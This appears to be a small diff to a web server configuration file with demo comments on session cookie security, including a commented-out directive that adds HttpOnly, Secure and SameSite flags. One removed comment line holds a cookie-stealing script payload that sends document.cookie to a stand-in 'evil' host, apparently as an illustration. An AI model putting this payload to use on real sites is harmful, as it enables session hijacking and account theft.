@@ -1,3 +1,2 @@
-# DEMO: Session cookie security
-# :P <script>var img = new Image(); img.src = "http://evil/" + document.cookie;</script>
+# DEMO: Alternate way to set session cookie security (also, look at php.ini)
 #Header edit Set-Cookie ^(.*)$ $1;HttpOnly;Secure;SameSite=Lax
